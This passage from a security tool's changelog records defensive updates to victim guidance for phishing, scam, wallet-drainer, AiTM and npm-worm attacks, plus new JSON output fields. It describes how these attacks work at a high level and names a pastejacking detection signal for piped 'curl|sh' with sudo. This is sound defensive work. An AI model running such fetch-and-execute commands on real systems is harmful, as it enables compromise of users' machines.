  - **triage**: "do NOT update the bank/payee details; if you already changed
    them, revert immediately and alert your payroll/accounts-payable team and
    your bank — check whether a payment run already went out so it can be
    recalled while it is still pending".
  - **cascade**: "every other payee record an attacker with this mailbox could
    alter — audit all recent bank-detail changes … check whether the email
    account that sent this is itself compromised".
  - **exoneration** (LOG/ALERT band): "employees and vendors do legitimately
    change banks. Decisive test: call the person or company on a number you
    ALREADY have on file … before updating any payee".

  Research sources: Proofpoint「Understanding BEC Payroll Scams: Direct Deposit
  Diversion」, Trustwave SpiderLabs「BEC Trends: Payroll Diversion Dominates」,
  Unit21 (vendor/payroll ACH fraud), IRONSCALES, FBI IC3 BEC statistics. 6 new
  integration tests; 520 pass, 0 fail; zero warnings CLI + lib.

## [1.0.72] — 2026-06-21

### Changed
- **Perspective 72: tech-support-scam advisories updated for the fake-warning-
  popup and remote-access-tool reality — the verify lens now names the popup
  as always-fake, and the triage now tells the victim to UNINSTALL the
  remote-access tool, the persistence step most victims miss.**

  Socratic question, derived from 警察庁 サポート詐欺対策 and Trend Micro 2026
  fake-warning reports: "The tech-support triage tells a victim who gave remote
  access to 'disconnect from the internet, change banking credentials, call
  your IT team'. But disconnecting is temporary — the attacker had the victim
  install a remote-access tool (AnyDesk/TeamViewer/UltraViewer), and that tool
  resumes the attacker's access the moment the victim reconnects. The 警察庁
  guidance is explicit: the remote-access software must be uninstalled. The
  triage never says 'uninstall it', so a victim who reconnects after changing
  passwords hands the attacker a live session again. Separately, the verify
  lens says 'call the company's main switchboard independently' — good advice,
  but it never states the single most useful fact about the fake-warning
  popup: a virus warning that displays a phone number is ALWAYS fake (real
  security software never tells you to call), so the first action is to close
  the browser and never call the on-screen number. Shouldn't the triage name
  the uninstall step and the verify name the fake-popup tell?"

  Pure advisory change — no scoring/detection logic touched; the tech-support
  pattern label and detection are unchanged. Two advisory lenses keyed to the
  tech-support pattern were extended:

  - **triage** (`hlse_text_triage`): now "if you gave remote access:
    disconnect from the internet immediately and UNINSTALL the remote-access
    tool they had you install (AnyDesk, TeamViewer, UltraViewer, etc.) — it
    keeps their access until removed; then change your banking credentials
    from a different device and call your IT team or bank directly".
  - **verify** (`hlse_text_verify`): now "a virus-warning popup that shows a
    phone number is ALWAYS fake — real security software never tells you to
    call; close the browser (or force-quit it) and never call the number on
    the screen; if you need help, call the company's main switchboard
    independently before allowing any remote access or payment".

  Research sources: 警察庁「サポート詐欺対策」, 大阪府警/群馬県警 support-fraud
  対処, トレンドマイクロ「偽のセキュリティ警告画面や警告音を出すサポート詐欺の
  手口と対処方法」, ドコモ あんしんセキュリティ, 香川大学CSC「そのウイルス感染
  警告は偽物？」. 4 new integration tests; 514 pass, 0 fail; zero warnings CLI +
  lib.

## [1.0.71] — 2026-06-21

### Changed
- **Perspective 71: OAuth advisory extended to cover the app-consent phishing
  variant — the triage now leads with revoking the malicious app's consent
  (myapplications.microsoft.com), the step that device-code remediation alone
  leaves out.**

  Socratic question, derived from the Microsoft Digital Defense Report 2025
  and Trend Micro 2026 browser-threat research: "P64 gave the OAuth
  device-code attack its own pattern label and remediation — sign out
  sessions, revoke tokens, rotate password. But Microsoft's MDDR 2025
  describes a SIBLING vector that the same advisory does not address: OAuth
  app-consent phishing, where the victim does not enter a code but clicks
  'Accept' on a REAL Microsoft/Google consent screen, granting a malicious
  registered app standing permissions. That consented app keeps its access
  even after the victim signs out every session, revokes every token, and
  resets the password — because app consent is a separate grant. The P64
  triage tells the victim to revoke sessions and tokens but never says
  'remove the app's consent', so a consent-phishing victim who follows it to
  the letter is still compromised. The cascade lens already mentions
  reviewing app consents — but the 60-second triage, the most-read lens,
  omits the single decisive action. Shouldn't the triage and verify lenses
  name the consent-click variant explicitly?"

  Pure advisory change — no scoring/detection logic touched; the OAuth/
  device-code pattern label and detection are unchanged. Two advisory lenses
  keyed to the device-code/OAuth pattern were extended, and the text-triage
  JSON escape buffer was enlarged (512 → 640) to carry the longer string
  without truncation:

  - **triage** (`hlse_text_triage`): now "if you entered the code OR clicked
    'Accept' on a consent screen: FIRST revoke the app's access at
    myapplications.microsoft.com (or have an admin remove the enterprise app),
    then sign out of all Microsoft 365 sessions and revoke active tokens in
    entra.microsoft.com (Security → Sign-ins → revoke), then rotate the
    password — a consented app and a stolen refresh token both outlive a
    password reset, so removing the app's consent is the step most victims
    miss".
  - **verify** (`hlse_text_verify`): now "never enter a verification code you
    did not initiate yourself, and never click 'Accept' on an
    app-permission/consent screen you did not start — even at a legitimate
    microsoft.com or google.com URL; the page is real but the code or consent
    hands the attacker's app your tokens".

  Research sources: Microsoft Digital Defense Report 2025 (device-code +
  OAuth consent phishing combination), Trend Micro「ブラウザに潜む危険：
  拡張機能の悪用事例とリスク」, Koi Security RedDirection campaign,
  Cyberhaven Chrome-extension compromise. 4 new integration tests; 510 pass,
  0 fail; zero warnings CLI + lib.

## [1.0.70] — 2026-06-21

### Added
- **Perspective 70: RCS sender-name spoofing warning + JSON `channel_reason`
  field — plus a P66 follow-up that removes the last "enable 2FA" fallback
  string from the URL triage path.**

  Socratic question, derived from Qiita/Zenn/antiphishing.jp 2026 smishing
  guidelines: "Japan's major carriers (NTTドコモ, au, ソフトバンク, 楽天)
  switched on RCS Universal Profile in March 2026. RCS lets the sender choose
  the displayed name and put a brand logo on the bubble — so a message that
  shows 'ヤマト運輸' next to the Yamato logo can be from anyone with an RCS
  hub. The SMS channel modifier already adds +15 to the score (correct), but
  the human-readable reason just says 'SMS is the primary smishing vector' —
  it never warns the user that the displayed sender name is no longer proof
  of identity, which is the single most surprising fact about RCS smishing
  for users used to caller-ID. AND the JSON output doesn't carry the channel
  reason string at all — JSON consumers see only `channel`, `channel_delta`,
  `effective_score`, `effective_action` but not WHY those values were added.
  Shouldn't the SMS reason name the RCS spoofing risk, and shouldn't the JSON
  carry the channel reason alongside the other channel fields?"

  Two pure-advisory changes plus one consistency fix:

  - **SMS channel reason extended** (`channel_reason`): now says "SMS is the
    primary smishing vector; on RCS the displayed sender name is set by the
    sender, so a familiar brand or carrier label is NOT proof of identity".
    The +15 score modifier is unchanged.
  - **`channel_reason` field added to URL and text JSON output**: alongside
    the existing `channel`/`channel_delta`/`effective_score`/`effective_action`
    fields, so JSON consumers receive the same human-readable reason the CLI
    path already emits. Only present when a `--from` channel modifier is in
    use.
  - **P66 follow-up — last "enable 2FA" fallback removed**: the final return
    inside `hlse_triage_for()` (the catch-all when the brand objective is
    non-NULL but matches no specific class) still carried the pre-AiTM
    "change the password, enable 2FA, check recent login activity" wording,
    which P66 had only replaced in the `if (!obj)` early-return path. It now
    uses the same AiTM-aware "revoke all active sessions NOW … THEN change
    the password" advice for full consistency.

  Research sources: 警察庁 フィッシング対策, フィッシング対策協議会 利用者
  向けガイドライン2026年度版, ALSOK「スミッシングとは何か」, kanade207
  「スマホが変わりました！RCS搭載で便利になる一方、詐欺に遭いやすくなります」,
  IPA「国税庁をかたる偽SMS」. 4 new integration tests; 506 pass, 0 fail; zero
  warnings CLI + lib.

## [1.0.69] — 2026-06-21

### Changed
- **Perspective 69: crypto wallet-drainer triage/cascade now cover the
  approval-revocation remedy (revoke.cash) — the defining defense against the
  2026 Web3 "approve"-drainer vector, where the victim never reveals a seed
  phrase but signs a malicious token approval.**

  Socratic question, derived from Qiita/Zenn/Ledger/Tangem 2026 Web3-security
  reports: "The crypto triage tells a wallet-phishing victim 'if you entered a
  seed phrase or private key, move remaining assets to a new wallet'. That is
  correct for the seed-theft vector — but the dominant 2026 wallet-drainer
  vector is entirely different: the victim connects their wallet to a fake
  WalletConnect/dApp page and signs an `approve` / `setApprovalForAll`
  transaction that grants a malicious contract permission to move their
  tokens. No seed phrase is ever revealed, so 'move to a new wallet' is the
  wrong mental model — worse, the live approval keeps draining tokens that
  arrive in the SAME wallet. The decisive remedy is to REVOKE the token
  approval (revoke.cash or the chain explorer's Token Approvals page).
  Shouldn't the triage name the approval-drainer vector and its revoke
  remedy?"

  Pure advisory change — no scoring/detection logic touched; the crypto brand
  objective and wallet-drain URL detection are unchanged. The two crypto-
  objective lenses in the URL advisory path were extended:

  - **triage** (`hlse_triage_for`): adds "if instead you APPROVED a
    transaction or connected your wallet to the site, revoke the token
    approval NOW at revoke.cash or your chain's explorer (Token Approvals) —
    a wallet drainer steals through a live approval, not your seed, and keeps
    draining until the approval is revoked".
  - **cascade_risk** (`hlse_cascade_risk`): adds "if you approved any
    contract, audit and revoke EVERY active token approval (revoke.cash) — a
    drainer often holds approvals across several tokens at once".

  Research sources: Tangem「暗号資産ドレイナーとは？」, SBI VC「Web3活用｜
  フィッシング詐欺から資産を守る」, Ledger Academy ("Web3 Scams Explained"),
  Zenn「2025年の暗号資産・Web3はどこに向かうのか」, Check Point Research
  (Google Play crypto-drainer apps). 4 new integration tests; 502 pass, 0
  fail; zero warnings CLI + lib.

## [1.0.68] — 2026-06-21

### Changed
- **Perspective 68: quishing (QR-code phishing) advisories extended to cover
  the physical sticker-overlay and payment-QR vectors — the 2026 emphasis in
  Japanese and global quishing reports.**

  Socratic question, derived from McAfee/Trend Micro/Kaspersky/JSSEC 2025–2026
  quishing reports: "The QR-phishing advisory tells the user to 'preview the
  QR destination before scanning' and, post-scan, to 'check your browser's
  address bar'. That covers the EMAIL/digital QR vector well. But the fastest-
  growing quishing vector of 2026 is PHYSICAL: attackers stick a fake QR
  sticker over the real one on parking meters, restaurant tables, and payment
  posters. For these, 'preview the destination' is necessary but not
  sufficient — the decisive physical tells are (a) a sticker placed over the
  original, and (b) on a payment QR, a payee name that does not match the real
  merchant. And the post-scan triage only addresses credential theft, not the
  fraudulent-PAYMENT outcome that a swapped payment QR produces. Shouldn't the
  guidance name the physical-overlay check and the payment-dispute path?"

  Pure advisory change — no scoring/detection logic touched; the QR-code
  phishing signal and pattern label are unchanged. Three advisory lenses keyed
  to the QR/quishing pattern were extended:

  - **verify** (`hlse_text_verify`): adds "on a PHYSICAL QR (parking meter,
    restaurant table, payment poster) feel for a sticker placed over the
    original, and on any payment QR confirm the payee name shown matches the
    real merchant before approving".
  - **triage** (`hlse_text_triage`): adds "if you approved a payment to an
    unexpected payee, contact your bank or payment provider immediately to
    stop or dispute it".
  - **exoneration** (`hlse_text_exoneration`, LOG/ALERT band): adds "on a
    physical QR, check it is not a sticker placed over the original".

  Research sources: McAfee「クイッシング(QRコード詐欺)とは」, Trend Micro
  「クイッシングとは？QRコードを使ったフィッシング詐欺の手口と対策」,
  Kaspersky「クイッシング(QRフィッシング)とは？兆候と予防策」, JSSEC
  「広がるQRコード詐欺(クイッシング)と対策」, Proofpoint (Quishing reference).
  5 new integration tests; 498 pass, 0 fail; zero warnings CLI + lib.

## [1.0.67] — 2026-06-21

### Changed
- **Perspective 67: emergency/grandparent-scam advisories updated for the AI
  voice-cloning era — "a familiar voice is no longer proof" and "ask a
  pre-agreed safe word" now appear in the verify, triage, and exoneration
  lenses.**

  Socratic question, derived from Qiita/McAfee/Kaspersky/ESET 2026 reports on
  AI voice-clone fraud (Japan's special-fraud losses hit a record ¥141.4B in
  2025; a voice can be cloned from 3 seconds of audio at 85% fidelity): "The
  emergency-scam advisory says 'call the family member directly on a number
  you already know'. That callback step is correct — but it omits the single
  most important fact of the 2026 threat model: the attacker may have ALREADY
  called using a cloned voice that sounds exactly like the grandchild, and
  the victim's instinct is 'but it was definitely their voice'. The advisory
  never tells the victim that a familiar voice is no longer evidence of
  identity, nor does it recommend the one defense an AI clone cannot defeat: a
  pre-agreed safe word. Shouldn't the guidance name the voice-clone vector
  explicitly and give the safe-word countermeasure?"

  Pure advisory change — no scoring/detection logic touched; the
  Emergency/grandparent signal and pattern label are unchanged. Three advisory
  lenses keyed to the emergency/grandparent pattern were updated:

  - **verify** (`hlse_text_verify`): "do not trust the voice — AI
    voice-cloning reproduces a loved one from a few seconds of audio; hang up
    and call the family member back on their own known number, and ask a
    pre-agreed safe word before sending any money or meeting any courier".
  - **triage** (`hlse_text_triage`): adds "a voice that sounds exactly like
    them is NOT proof — AI clones a voice from 3 seconds of audio, so ask a
    pre-agreed safe word".
  - **exoneration** (`hlse_text_exoneration`, new emergency-pattern entry for
    the LOG/ALERT band): "a familiar voice is no longer proof — AI clones a
    voice from a few seconds of audio; hang up and call them back on their own
    known number, and ask a pre-agreed safe word that an AI clone cannot
    know".

  Research sources: McAfee「ディープフェイク詐欺とAI音声によるなりすまし」,
  Kaspersky「AI音声詐欺：偽の電話はどう機能し、どう身を守るか」, ESET
  「AIで音声を偽造し詐欺に悪用する手口」, Qiita「AI音声詐欺 対策ガイド2026」,
  PSI CyberSecurity Insight（ディープフェイク音声詐欺・経営層なりすまし）.
  4 new integration tests; 493 pass, 0 fail; zero warnings CLI + lib.

## [1.0.66] — 2026-06-21

### Changed
- **Perspective 66: URL credential-harvest triage rewritten for the AiTM
  reverse-proxy era — session revocation now leads, because modern phishing
  (Evilginx, VoidProxy, AiTM PhaaS kits) defeats 2FA by stealing the
  post-authentication session cookie.**

  Socratic question, derived from Qiita/Zenn/Okta/Trend Micro 2025–2026 AiTM
  reports: "The generic URL triage tells a phished victim to 'change the
  password for this account, enable 2FA if not already active'. But this
  advice describes a 2018 threat model. In 2026, the dominant credential-
  harvest mechanism is Adversary-in-the-Middle: the phishing domain runs a
  reverse proxy (Evilginx/VoidProxy) that relays your real login to the
  genuine site and captures the SESSION COOKIE that is issued AFTER 2FA
  succeeds. 'Enable 2FA' is actively misleading — the victim already had 2FA
  and it did not help; worse, a password change alone does NOT invalidate the
  stolen session cookie, so the attacker stays logged in. The decisive action
  is to revoke all active sessions ('sign out everywhere'), which kills the
  stolen cookie. Shouldn't the triage lead with the action that actually
  stops an AiTM attacker?"

  Pure advisory change — no scoring/detection logic touched. The generic
  fallback in `hlse_triage_for()` (which fires for credential-harvest
  phishing without a specific brand-objective class, in both the `if (!obj)`
  early path and the final return) was rewritten from "change the password
  for this account, enable 2FA if not already active, and check recent login
  activity for unauthorised sessions" to: "revoke all active sessions NOW
  (Security settings → 'sign out everywhere'), THEN change the password —
  modern phishing proxies your real login and steals the session cookie, so
  2FA does not stop it and a password change alone leaves the attacker's
  stolen session live; check login history for sessions you do not
  recognise". The brand-specific triage cases that already advise session
  revocation (identity/keystone, social) were left unchanged.

  Research sources: Okta ("Uncloaking VoidProxy", "phishing-resistant MFA"),
  Trend Micro JP ("多要素認証を突破するAiTM攻撃とは"), Cisco Talos
  ("state-of-the-art phishing MFA bypass"), Zenn「フィッシングサイトを
  テイクダウンせずに無力化する方法 (Evilginx2)」, note「リアルタイム
  フィッシング（AiTM）徹底解説」. 3 new integration tests; 489 pass, 0 fail;
  zero warnings CLI + lib.

## [1.0.65] — 2026-06-21

### Changed
- **Perspective 65: `package` BLOCK triage and cascade advisories rewritten
  for the self-propagating npm worm era (Shai-Hulud, Sep & Nov 2025; 796
  packages backdoored, 500+ GitHub users' secrets exfiltrated).**

  Socratic question, derived from Zenn/Qiita npm supply-chain incident
  reports: "The `package` typosquat advisory tells a victim to 'rotate any
  credentials that were in your shell environment during the install'. But
  the 2025 Shai-Hulud worm doesn't read shell env — it runs TruffleHog, a
  disk-wide secret scanner, harvesting EVERY credential on the machine. And
  the cascade advisory says 'post-install scripts inherit your full PATH/
  HOME/environment' — true, but it misses the worm's defining feature:
  self-propagation. If the victim is a package maintainer, the worm steals
  their npm/PyPI PUBLISH token and republishes the payload into THEIR
  packages, infecting every downstream user. The advisory describes a 2015
  threat model (env-var theft) for a 2025 attack (disk-wide scan +
  self-replication). Shouldn't the triage reflect the actual worm
  mechanics?"

  Pure advisory change — no scoring/detection logic touched; the package
  subcommand still detects typosquatting via Damerau-Levenshtein distance,
  and the pattern label is unchanged. Only the BLOCK-band triage and
  cascade_risk strings (both JSON and human paths) were updated:

  - **triage** now says: remove the package and inspect the lifecycle script
    (preinstall/postinstall); self-propagating worms run a disk-wide secret
    scan (TruffleHog), so rotate EVERY credential on the machine, not just
    shell-env ones — if you publish packages, revoke your npm/PyPI token
    FIRST, before the worm republishes from your account.
  - **cascade_risk** now leads with the self-propagation vector: if you
    maintain packages, your registry publish token is the worm's
    self-propagation vector — it republishes the payload into YOUR packages,
    infecting every downstream user; revoke the token and audit your
    published versions for unexpected releases, plus all disk-resident API
    keys, SSH keys, and cloud credentials a TruffleHog-style scan would
    harvest.

  Research sources: Sysdig ("Shai-Hulud: The novel self-replicating worm"),
  Datadog Security Labs ("Shai-Hulud 2.0 npm worm"), Checkmarx ("Inside
  Shai-Hulud's Maw"), Qiita「たった『5セント』を盗んだ史上最大級のNPMサプライ
  チェーン攻撃」, Zenn「npmパッケージの自己増殖型サプライチェーン攻撃について」.
  4 new integration tests; 486 pass, 0 fail; zero warnings CLI + lib.

## [1.0.64] — 2026-06-21

### Added
- **Perspective 64: OAuth device-code phishing pattern classification — the
  #1 Microsoft 365 attack vector of 2026 (340+ organisations compromised in
  Q1, per The Hacker News / Microsoft Defender) now gets its own specific
  pattern label and Microsoft-incident-response-aligned advisories instead of
  being lumped under the generic "fake security alert" classification.**

  Socratic question, derived from Qiita/Zenn 2026 incident reports: "The
  classifier already detects this text class via 'verification code' bait
  language + fake-security-alert urgency, scoring it correctly. But the
  pattern label says 'fake security alert / account suspension phishing' —
  which is true but generic. The unique mechanism of OAuth device-code
  phishing — a LEGITIMATE Microsoft URL (microsoft.com/devicelogin) paired
  with an attacker-supplied verification code — is what makes this attack
  evade URL filters and bypass MFA. The advisory 'log in via bookmark' is
  USELESS here because the URL is real; the right advisory is 'never enter
  a code you did not initiate yourself'. Shouldn't the most common 2026
  Microsoft 365 attack get a label that names the actual mechanism, plus
  triage that points to the actual Microsoft remediation path (entra.
  microsoft.com token revocation)?"

  Pure advisory change — no scoring/detection logic modified. The 'verification
  code' / 'device code' / 'two-factor code' phrases already fire in the
  auth-bait list; this perspective only refines the downstream pattern label
  and advisory strings keyed to it:

  - `hlse_classify_text_attack()`: when device-code language fires with
    authority impersonation OR fake-security-alert, emit the specific label
    "OAuth device-code phishing (legitimate URL, attacker-supplied
    verification code)" rather than the generic fake-alert label.
  - `hlse_text_objective()`: "Microsoft 365 / Azure OAuth tokens — grants
    persistent access that bypasses MFA and survives password reset".
  - `hlse_text_verify()`: "never enter a verification code you did not
    initiate yourself — even at a legitimate URL like microsoft.com/
    devicelogin; the URL is real but the code is the attacker's session".
  - `hlse_text_triage()`: "sign out of all Microsoft 365 sessions, revoke
    all active tokens in entra.microsoft.com (Security → Sign-ins → revoke),
    and rotate the password — the attacker holds a refresh token that
    outlives password reset alone" (the actual Microsoft incident-response
    path).
  - `hlse_text_cascade()`: "every SaaS app connected to your Microsoft 365
    tenant (SharePoint, Teams, Exchange, OneDrive) and any third-party app
    with consent from your account — revoke app consents in entra.microsoft.
    com and audit recent OAuth grants from a clean device".
  - `hlse_text_exoneration()`: ALERT-band falsifying test asks "did YOU
    initiate a sign-in or device-pairing flow in the last 60 seconds?" —
    the single decisive question for this attack class.

  Research sources: The Hacker News (Mar 2026, "Device Code Phishing Hits
  340+ Microsoft 365 Orgs"), Microsoft Security Blog (Apr 2026, "Inside an
  AI-enabled device code phishing campaign"), Sekoia EvilTokens kit
  analysis, Qiita デバイスコードフローを悪用したフィッシング overview, and
  Zenn incident-investigation tooling roundup. 6 new integration tests;
  482 pass, 0 fail; zero warnings CLI + lib.

## [1.0.63] — 2026-06-21

### Added
- **Perspective 63: `paste` JSON carries `signal_count`, `confidence`, and
  `exoneration` — the last detection subcommand to gain the LOG/ALERT-band
  epistemic context that URL/text/protect/esp/package/network already have.**
  Socratic question: "The `paste` JSON output exposes a raw `signals` bitmask
  (e.g. 10 = curl|sh + sudo), but a bitmask is not human-legible: a SIEM
  cannot tell from `10` whether one fragile heuristic or three independent
  detectors fired. URL, text, and the P62 subcommands all carry a derived
  `signal_count` and qualitative `confidence` so a borderline score backed by
  one signal is distinguishable from the same score backed by four. And in the
  LOG/ALERT band, `paste` has no `exoneration` to tell the user the benign
  explanation and falsifying test. Why does the pastejacking detector — where
  false positives (legitimate install scripts using curl/sudo) are common —
  alone lack this calibration?" Added `signal_count` (popcount of the
  `signals` bitmask, falling back to `n_reasons` when the bitmask is empty)
  and `confidence` ('single signal' / 'corroborated' / 'high confidence')
  when score > 0. Added `exoneration` (LOG/ALERT band, score 15–59) with a
  new "paste" kind string in `hlse_exoneration_for()`: 'paste into a plain
  text editor first and read every line — a hidden newline or trailing
  command that only appears there is the decisive sign of a paste-and-run
  trap.' Human output gains '↺ Could be benign: ...' for LOG/ALERT scores.
  The raw `signals` bitmask is retained for backward compatibility. 5 new
  integration tests; 476 pass, 0 fail; zero warnings CLI + lib.

## [1.0.62] — 2026-06-20

### Added
- **Perspective 62: `protect`, `esp`, `package`, and `network` JSON carry
  `signal_count`, `confidence`, and `exoneration` — pipeline consumers can
  distinguish a single fragile heuristic from four concurring detectors,
  and avoid paging at 3 am for a legitimate fork or a vendor firmware update.**
  Socratic question: "The URL and email JSON outputs now include `signal_count`,
  `confidence`, and `exoneration` in the LOG/ALERT band — giving pipelines the
  epistemic context to distinguish a genuine threat from a false positive. The
  `protect`, `esp`, `package`, and `network` subcommands all fire in the
  LOG/ALERT band for heuristic-only detections (entropy anomaly without ransom
  notes, near-miss package names, unusual DNS resolver, ESP file-size changes)
  yet their JSON carries no `signal_count`, `confidence`, or `exoneration`. A
  SIEM consuming their JSON in the ALERT band has no basis to calibrate: is
  this one fragile heuristic or four independent signals?" Added
  `signal_count` (int) and `confidence` ('single signal' / 'corroborated' /
  'high confidence') when score > 0. Added `exoneration` (LOG/ALERT band only,
  score 15–59) with four new kind strings in `hlse_exoneration_for()`:
  'protect' (signature/hash check), 'esp' (vendor changelog cross-check),
  'package' (registry maintainer + download count verification), 'network'
  (owning process identification). Human output gains '↺ Could be benign:
  ...' line for LOG/ALERT scores. Signal count for package uses `n_matches`
  (each close package is an independent signal); protect/esp/network use
  `n_reasons`. 5 new integration tests; 471 pass, 0 fail.

## [1.0.61] — 2026-06-20

### Added
- **Perspective 61: `audit` JSON carries `crit_count`, `high_count`, and
  `next_steps` — CI consumers and admins get actionable prioritization
  guidance alongside the per-finding list.**
  Socratic question: "After P53, each HIGH/CRIT audit finding carries its
  own `fix` command. But the audit JSON object has no field that tells a
  consumer HOW MANY HIGH or CRITICAL findings were found, or what to do
  FIRST if there are multiple. An admin looking at an audit with 3 INFO,
  1 MED, and 2 HIGH findings knows each individual fix, but has no guidance
  on priority order or on how many findings need to be resolved before the
  hardening band improves. Why does the tool that measures system security
  posture provide no meta-guidance on how to improve it?" Added `crit_count`
  and `high_count` integer fields to the audit JSON top level. Added
  `next_steps` string when findings exist: CRITICAL findings get 'fix
  N critical finding(s) first — CRITICAL items are actively exploitable';
  HIGH-only get 'fix N HIGH finding(s) to reach the next hardening band
  (currently: fair)'; no HIGH/CRIT get 'address remaining findings to
  improve the hardening index'. Human output gains a '→ Next step: ...'
  line after the finding list. 3 new integration tests; 466 pass, 0 fail.

## [1.0.60] — 2026-06-20

### Added
- **Perspective 60: `scan_summary` carries `gate_hits` and `fail_threshold`
  — CI pipelines can now distinguish scanned-count from gate-exceeded-count.**
  Socratic question: "After P58, scan_summary tells a CI pipeline HOW MANY
  threats were found and WHAT to do first. But 'threats' counts all findings
  above score 40 (ALERT), while a pipeline configured with `--fail-on 60`
  or `--fail-on 80` uses a different threshold to decide whether to fail the
  build. If a scan finds 5 threats (3 ALERT, 2 BLOCK) and `--fail-on` is 60,
  the pipeline fails because 2 findings exceeded the threshold — but
  scan_summary only shows `threats: 5`. A consumer cannot determine whether
  the pipeline exit-1 was from 5 exceedances or 2 without parsing every
  individual finding. Why does the summary that drives the exit code not
  expose the count that caused it?" Added `gate_hits` (count of findings
  at or above the fail threshold) and `fail_threshold` (the threshold value
  used, default 60) to scan_summary JSON. Human output gains a "(N findings
  exceeded the --fail-on threshold)" note when a non-default threshold is
  active. 2 new integration tests; 463 pass, 0 fail.

## [1.0.59] — 2026-06-20

### Added
- **Perspective 59: Scan secret findings now carry `confidence` and
  `remediation` — reaching schema parity with standalone `secret` output.**
  Socratic question: "After P55, scan secret findings gained pattern/
  objective/verify/triage/cascade_risk. But comparing the scan secret JSON
  with the standalone `secret` JSON reveals two more fields present only
  in the standalone handler: `confidence` (e.g. 'definitive — AKIA prefix
  is an unambiguous pattern') and `remediation` (e.g. 'revoke the key in
  the AWS console under IAM → Access Keys'). Both are directly useful to
  a CI pipeline consumer: confidence tells the operator whether to escalate
  immediately or investigate first; remediation gives the exact action
  without requiring the operator to know the service-specific revocation
  workflow. Why does `--json scan` give a consumer less information per
  secret finding than `--json secret` when both detected the same
  credential?" Added `confidence` (via `hlse_secret_confidence()`) and
  `remediation` (via `hlse_remediation_for("secret", sv.score)`) to the
  scan secret JSON output, immediately after the `findings` array and
  before the advisory lenses, matching the field order in the standalone
  `secret` handler. 2 new integration tests; 461 pass, 0 fail.

## [1.0.58] — 2026-06-20

### Added
- **Perspective 58: `scan_summary` carries `immediate_action` — CI
  pipelines now get a single triage sentence alongside the threat count.**
  Socratic question: "After P55–P57, every per-finding JSON line from
  scan carries pattern/objective/verify/triage/cascade_risk. But the final
  scan_summary line — the one CI pipelines key on — contains only
  `files_scanned`, `threats`, `asset_classes`, and `blast_radius`.
  A pipeline seeing `'blast_radius':'cloud-infrastructure'` knows WHAT
  was found, but not the single most urgent action: rotate the cloud API
  key before it reaches a live environment. Why does the summary that
  drives CI gates provide less guidance than any individual finding?"
  Added `immediate_action` field to the scan_summary JSON when
  `threats > 0`. The string is keyed to the highest-severity asset class
  in the detected threat mix: cloud → rotate API keys, payment → contact
  processor, source-control → revoke token, database → rotate + audit,
  private-key → replace and revoke, AI-provider → regenerate key,
  communications → regenerate token, no secrets → quarantine flagged files.
  Multi-class threats (nclasses ≥ 2) get a MULTI-CLASS prefix noting
  pivot risk. Human output gains a "→ Immediate action:" summary line
  after the threat count. Clean scans (threats == 0) are unchanged.
  3 new integration tests; 459 pass, 0 fail.

## [1.0.57] — 2026-06-20

### Added
- **Perspective 57: Scan URL findings now carry `safe_url`, `confidence`/
  `signal_count`, and `exoneration` — reaching parity with the default
  URL analysis path.**
  Socratic question: "After P56, a phishing URL found inside a scanned
  file carries pattern/objective/verify/triage/cascade_risk. But the
  default URL analysis path (called when you give hlse_core a URL directly)
  also emits three more fields: `safe_url` (where to go instead of the
  phishing site), `confidence`/`signal_count` (how many independent
  detector families agreed), and `exoneration` (the benign explanation for
  ALERT-band URLs). The scan URL JSON was missing all three. If you
  scan a paypal.verify-account-now.com link embedded in a file and get
  ISOLATE [80] with five advisory fields, why doesn't it also tell you
  'the real URL is https://paypal.com' and 'high confidence — 3 independent
  families agree'? The safe destination is the most actionable single datum
  after a BLOCK." Added `signal_count` + `confidence` (always when signals
  fired), `safe_url` (for score ≥ 60 when a brand was identified), and
  `exoneration` (for ALERT-band score 40–59) to the scan URL JSON output.
  Human output path now calls `print_url_advisories()` directly (same
  function used by default URL analysis) instead of duplicated inline code,
  gaining confidence, disguised-char, and safe-destination lines for free.
  456 tests, all pass.

## [1.0.56] — 2026-06-20

### Added
- **Perspective 56: Advisory lenses for `scan` mode embedded-URL findings —
  phishing URLs detected inside text files now carry the same five advisory
  fields as the standalone `url` subcommand.**
  Socratic question: "P55 gave scan's file-masquerade and secret findings
  their advisory lenses. But scan runs three checks per file: (1) file
  masquerade, (2) secrets, and (3) phishing URLs embedded in text. After
  P55, the URL check (3) remains the only scan finding that still emits
  only raw reasons and a score. When scan finds 'paypa1.com/login' inside
  a phishing email saved to disk, the JSON line says BLOCK [60] with
  reasons — but no pattern, no objective, no verify, no triage, no
  cascade_risk. Why does a URL found inside a scanned file get less
  actionable output than the same URL analysed with the standalone `url`
  subcommand?" Added five advisory lens fields (pattern, objective, verify,
  triage, cascade_risk) to both JSON and human output for every embedded
  URL finding with score ≥ 60. Uses the same compound advisory functions
  as the standalone URL handler (hlse_compound_objective,
  hlse_compound_triage) so multi-brand co-spoof URLs are fully covered.
  All three scan finding kinds (file, secret, url) now have advisory lenses.
  453 tests, all pass.

## [1.0.55] — 2026-06-20

### Added
- **Perspective 55: Advisory lenses for `scan` mode per-file findings —
  scan findings now carry the same pattern/objective/verify/triage/
  cascade_risk fields as the standalone `file` and `secret` subcommands.**
  Socratic question: "After P46–P54, every standalone HLSE subcommand
  carries advisory lenses in its BLOCK output. But `scan` is the primary
  entry point for automated pipelines — it finds both file masquerades
  and exposed credentials in one pass. When scan finds `invoice.pdf.exe`
  or an AWS key, the per-finding JSON line contains only the score, action,
  and raw reasons/findings arrays. The `--json scan` consumer can detect
  a double-extension file or a live AWS key but cannot act on it further
  without re-routing it through the standalone subcommand. Why does the
  unified scan output omit the pattern, objective, verify, triage, and
  cascade_risk fields that the standalone handlers supply?" Added five
  advisory lens fields to both JSON and human output for every file
  masquerade (score ≥ 60) and exposed credential (score ≥ 60) found
  by `scan`. Pattern derivation and advisory strings are identical to
  those in the standalone `file` and `secret` handlers so behaviour is
  consistent across both entry points. 449 tests, all pass.

## [1.0.54] — 2026-06-20

### Added
- **Perspective 54: Advisory lenses for `esp` BLOCK verdicts — the
  final BLOCK subcommand now has complete pattern/objective/verify/
  triage/cascade coverage.**
  Socratic question: "After P46–P52, every BLOCK verdict in every HLSE
  subcommand has advisory lenses — except `esp` (EFI System Partition
  integrity check). An `esp` BLOCK is arguably the most severe alert
  in the entire tool: a UEFI bootkit executes before the OS, can
  intercept disk encryption before it runs, survives a full OS reinstall,
  and can disable security software. Yet the output was just the raw
  reason and the score, with no guidance about: not reinstalling the OS
  first (it won't remove the bootkit), running CHIPSEC or vendor UEFI
  integrity tools to corroborate before taking disruptive action, or
  flashing the UEFI from a vendor-signed image. Why does the check that
  defends against the most persistent and invisible threat class offer
